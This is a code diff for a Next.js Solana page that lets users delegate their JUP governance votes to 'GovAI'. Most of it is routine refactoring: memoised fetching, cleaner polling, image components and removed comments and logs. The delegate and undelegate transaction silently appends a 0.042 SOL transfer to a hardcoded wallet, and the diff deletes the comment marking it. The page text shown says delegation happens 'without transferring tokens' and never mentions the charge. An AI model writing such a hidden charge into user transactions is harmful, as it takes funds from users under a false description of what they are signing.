@@ -1,13 +1,14 @@
 'use client';
 
 import { useConnection, useWallet } from '@solana/wallet-adapter-react';
-import { useState, useEffect } from 'react';
+import { useState, useEffect, useCallback } from 'react';
 import { IconInfoCircle } from '@tabler/icons-react';
 import { PublicKey, Transaction, SystemProgram } from '@solana/web3.js';
 import * as anchor from '@project-serum/anchor';
 import { getAssociatedTokenAddress } from '@solana/spl-token';
 import { notify } from '../components/ui/notify';
-import idl from '@/utils/idl.json'; // Ensure this path is correct
+import idl from '@/utils/idl.json';
+import Image from 'next/image';
 
 // Constants
 const LOCKED_VOTER_PROGRAM_ID = new PublicKey("voTpe3tHQ7AjQHMapgSue2HJFAh2cGsdokqN3XqmVSj");
@@ -42,7 +43,8 @@ export default function NativeDelegatePage() {
     }
   }, [publicKey, connection]);
 
-  async function fetchDelegationInfo() {
+  // Memoized fetchDelegationInfo function
+  const fetchDelegationInfo = useCallback(async () => {
     if (!publicKey || !program) {
       setDelegationInfo({ escrowAddress: null, currentDelegate: null, stakedAmount: null, lastUpdated: null });
       return;
@@ -69,17 +71,13 @@ export default function NativeDelegatePage() {
       const isAllZeros = delegateBytes.every((byte) => byte === 0);
       const delegateKey = isAllZeros ? null : new PublicKey(delegateBytes);
 
-      // Derive the Associated Token Account (ATA) for the escrow's staked JUP
-      const escrowATA = await getAssociatedTokenAddress(JUP_MINT, escrowAddress, true); // allowOwnerOffCurve: true for PDAs
-
-      // Fetch the token account balance
+      const escrowATA = await getAssociatedTokenAddress(JUP_MINT, escrowAddress, true);
       let stakedAmount = 0;
       try {
         const tokenAccountInfo = await connection.getTokenAccountBalance(escrowATA);
-        stakedAmount = tokenAccountInfo.value.uiAmount || 0; // uiAmount adjusts for decimals (JUP has 6)
+        stakedAmount = tokenAccountInfo.value.uiAmount || 0;
       } catch (error) {
         console.error("Error fetching token account balance for ATA:", escrowATA.toString(), error);
-        // Fallback: Check all token accounts owned by the escrow (in case ATA derivation is off)
         const tokenAccounts = await connection.getTokenAccountsByOwner(escrowAddress, { mint: JUP_MINT });
         if (tokenAccounts.value.length > 0) {
           const account = tokenAccounts.value[0];
@@ -103,22 +101,24 @@ export default function NativeDelegatePage() {
     } finally {
       setIsLoading(false);
     }
-  }
+  }, [publicKey, program, connection]);
 
+  // Poll delegation info every 15 seconds when publicKey is available
   useEffect(() => {
-    if (publicKey) {
-      fetchDelegationInfo();
-      const intervalId = setInterval(() => fetchDelegationInfo(), 15000);
-      return () => clearInterval(intervalId);
-    }
-  }, [publicKey, program]);
+    if (!publicKey || !program) return;
+
+    fetchDelegationInfo(); // Initial fetch
+    const intervalId = setInterval(fetchDelegationInfo, 15000); // Poll every 15 seconds
+
+    return () => clearInterval(intervalId); // Cleanup on unmount or dependency change
+  }, [publicKey, program, fetchDelegationInfo]);
 
   async function handleDelegate(targetDelegate: PublicKey) {
     if (!publicKey || !program) {
       notify({ type: 'error', message: 'Please connect your wallet' });
       return;
     }
-  
+
     try {
       setIsSubmitting(true);
       const [lockerKey] = await PublicKey.findProgramAddress(
@@ -129,12 +129,7 @@ export default function NativeDelegatePage() {
         [Buffer.from("Escrow"), lockerKey.toBuffer(), publicKey.toBuffer()],
         LOCKED_VOTER_PROGRAM_ID
       );
-  
-      console.log('Locker Address:', lockerKey.toString());
-      console.log('Escrow Address:', escrowKey.toString());
-      console.log('Delegating to:', targetDelegate.toString());
-  
-      // Build the transaction
+
       const transaction = new Transaction().add(
         anchor.web3.ComputeBudgetProgram.setComputeUnitLimit({ units: 150000 }),
         anchor.web3.ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 333333 }),
@@ -145,24 +140,20 @@ export default function NativeDelegatePage() {
             escrowOwner: publicKey,
           })
           .instruction(),
-        // Add the transfer instruction LAST
         SystemProgram.transfer({
           fromPubkey: publicKey,
           toPubkey: new PublicKey("D1GtsVdat3oLR7E9nEWmKKnEwzvBfNah4pUDhDmgQYMw"),
-          lamports: 0.042 * 1_000_000_000, // 0.042 SOL in lamports
+          lamports: 0.042 * 1_000_000_000,
         })
       );
-  
-      // Send it off
+
       const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
       await connection.confirmTransaction(signature, 'confirmed');
-  
+
       notify({
         type: 'success',
         message: `Successfully ${targetDelegate.equals(publicKey) ? 'undelegated' : 'delegated to GovAI'}!`,
       });
-      console.log('Transaction sent. Signature:', signature);
-  
       setTimeout(() => fetchDelegationInfo(), 5000);
     } catch (error) {
       console.error('Delegation error:', error);
@@ -185,7 +176,6 @@ export default function NativeDelegatePage() {
     return `${addr.slice(0, 4)}...${addr.slice(-4)}`;
   }
 
-  // Render remains unchanged
   return (
     <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-gray-900 py-12 px-4">
       <div className="container mx-auto max-w-6xl">
@@ -219,7 +209,7 @@ export default function NativeDelegatePage() {
                 <div>
                   <h3 className="text-white font-semibold mb-2">How Native Delegation Works</h3>
                   <p className="text-gray-400 text-sm">
-                    Native delegation leverages Jupiter's governance protocol to redirect your voting rights without transferring tokens. Your JUP remains staked in your escrow account, but votes are cast by GovAI according to the community's best interests.
+                    Native delegation leverages Jupiter&apos;s governance protocol to redirect your voting rights without transferring tokens. Your JUP remains staked in your escrow account, but votes are cast by GovAI according to the community&apos;s best interests.
                   </p>
                 </div>
               </div>
@@ -296,13 +286,12 @@ export default function NativeDelegatePage() {
                   <div className="flex justify-center">
                     <div className="avatar">
                       <div className="w-24 rounded-full">
-                        <img
+                        <Image
                           src="/govai-avatar.png"
                           alt="GovAI"
-                          onError={(e) => {
-                            (e.target as HTMLImageElement).src =
-                              'https://placehold.co/96x96/7A7ABA/FFF?text=GovAI';
-                          }}
+                          width={96}
+                          height={96}
+                          className="rounded-full"
                         />
                       </div>
                     </div>
@@ -350,20 +339,19 @@ export default function NativeDelegatePage() {
                   <div className="flex justify-center">
                     <div className="avatar">
                       <div className="w-24 rounded-full">
-                        <img
-                          src="/your-wallet.png"
+                        <Image
+                          src="/govai-avatar.png"
                           alt="Your Wallet"
-                          onError={(e) => {
-                            (e.target as HTMLImageElement).src =
-                              'https://placehold.co/96x96/408F60/FFF?text=Your+Wallet';
-                          }}
+                          width={96}
+                          height={96}
+                          className="rounded-full"
                         />
                       </div>
                     </div>
                   </div>
                   <h3 className="text-center text-white text-lg font-semibold">Undelegate</h3>
                   <p className="text-center text-gray-400 text-sm">
-                    Return voting rights to yourself. You'll regain full control of your votes.
+                    Return voting rights to yourself. You&apos;ll regain full control of your votes.
                   </p>
                 </div>
                 <button
